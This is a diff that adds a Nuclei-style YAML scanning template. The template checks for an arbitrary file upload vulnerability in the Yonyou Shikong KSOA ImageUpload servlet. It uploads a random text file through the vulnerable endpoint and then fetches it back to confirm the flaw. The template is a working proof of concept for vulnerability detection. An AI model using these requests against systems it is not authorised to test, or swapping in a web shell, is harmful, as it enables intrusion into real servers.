@@ -1,0 +1,44 @@
+id: poc-yaml-yysk-KSOA-ImageUpload-file-upload
+info:
+  name: 用友时空KSOA ImageUpload任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  metadata:
+    finger: 用友时空KSOA
+
+variables:
+  t1: "{{rand_text_alphanumeric(8)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: "upload-file"
+    method: POST
+    path:
+      - "{{BaseURL}}/servlet/com.sksoft.bill.ImageUpload?filename={{t1}}.txt&filepath=/"
+    body: "{{t2}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<root>"
+          - "{{t1}}"
+
+  - id: "verify-upload"
+    method: GET
+    path:
+      - "{{BaseURL}}/pictures/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
